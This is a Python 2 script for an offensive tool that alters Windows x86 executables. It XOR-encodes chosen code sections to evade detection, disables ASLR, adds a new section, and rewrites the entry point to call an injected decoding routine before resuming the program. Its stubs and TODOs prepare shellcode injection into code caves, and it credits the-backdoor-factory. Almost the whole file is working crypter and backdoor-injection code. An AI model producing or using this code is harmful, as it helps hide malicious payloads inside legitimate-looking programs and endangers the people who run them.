#!/usr/bin/python
# -*- coding: utf-8 -*-
# Credits:
# http://git.n0p.cc/?p=SectionDoubleP.git;a=blob;f=SectionDoubleP.py
# https://msdn.microsoft.com/en-us/library/ms809762.aspx
# https://github.com/secretsquirrel/the-backdoor-factory
#
# TODO
#   - Add function to resume execution (not really working at the moment)
#   - Find code cave to put shellcode into
#   - XOR .text and/or .Xdata sections
#   - Fix prologue (for XOR sections)
import sys
import random
import string
import struct
import signal
import os
# Required
try: # Kind of check to ensure all modules are installed
    import pefile
    import argparse
    from pwn import disasm, asm
except:
    print "Please install the following modules to ensure %s works" % (sys.argv[0])
    print " - pefile"
    print " - argparse"
    print " - pwn"
    sys.exit(1)

# Import custom modules/functions
from f_generic import *
from pe_x86 import *

#####################################################
# Functions
#####################################################

### XOR a section to "bypass"
def main_xor(pe, xor_section_name = None, new_section_name = None, output_file = None, verbose = False):
    print "\n[*] Entering XOR section(s) function"
    prologue = pe.figure_prologue()
    pe.disable_aslr()

    # Get sections from user
    list_sections = user_given_sections(pe.get_sections(), xor_section_name)
    # Generate a new section name (if not given by user) & create a new section
    new_section = pe.create_new_section(sectionName=gen_section_name(new_section_name))
    if (verbose): # Verbose - display newly created section
        pe.iterate_trough_pe_sections()

    # Go through all sections given by user
    for section, i in list_sections:
        print "[*] XORing \"%s\" section" % (section.Name.replace("\x00",""))
        # xor_update_section() will XOR the given section
        pe.xor_update_section(section)
        # Make section writable
        pe.change_section_flags(".text")

    # Add prologue & resume PE's legit execution flow
    xor_routine, offset_start = pe.add_resume_instructions(new_section)
    # Where to jump from Entry Point
    origin_addr = pe.ep_addr + ((offset_start - 5) if (offset_start > 0) else 0) + 5 # add +5 since the entry point is replaced with a CALL
    dest_addr = new_section.VirtualAddress
    where_2_jmp = calc_jmp_offset(origin_addr, dest_addr)

    # Erase previous instructions @EntryPoint
    if ((offset_start - 5) % 2) == 0:
        erase_entry_point = "\x40\x48" * ((offset_start - 5)/2)    # INC EAX; DEC EAX
    else:
        erase_entry_point = "\x90" * (offset_start - 5)            # NOPs
    erase_entry_point += "\xE8" + where_2_jmp

    # Change code @ entry point
    pe.update_entry_point((dest_addr-origin_addr), erase_entry_point)
    # Update code to add XOR routine
    pe.inject_shellcode(xor_routine, new_section.VirtualAddress)

    if (verbose):
        print "[*] Check @EntryPoint and @XOR routine"
        display_ASM_instructions(pe.get_ASM_instructions(pe.ep_addr, 30), pe.ep_addr)
        display_ASM_instructions(pe.get_ASM_instructions(new_section.VirtualAddress, len(xor_routine)), new_section.VirtualAddress)

    # Write PE file
    pe.write_PE_file(output_file)

#####################################################
# Main
#####################################################
if __name__ == "__main__":
    # Handle SINGINT
    signal.signal(signal.SIGINT, signal_handler)
    # Parse user's arguments
    args = parser()
    # Is verbose ?
    if (args.verbose):
        print "\n[*] Verbose: ON"

    # ONLY FOR x86 at the moment
    pex86 = pe_x86(args.file, args.verbose)
    pex86.load_pe()
    # Load and analyse PE file
    pex86.analyse()

    if (args.analyse): # Look for code cave
        pex86.pe_deeper_analysis()
    elif (args.fcc):
        pass
        #find_code_cave(pe_struct)
    elif (args.xor):
        main_xor(pex86, args.xor_sec, args.new_sec_name, args.output, args.verbose)
    elif (args.shellcode):
        pass
        #main_inject_shellcode(pe_struct, args.shellcode, args.new_sec_name, args.output, args.sh_cc, args.verbose)
    elif (args.test):
        #main_test(pe_struct)
        pass
    print "\n[*] Finished.\nExiting..."
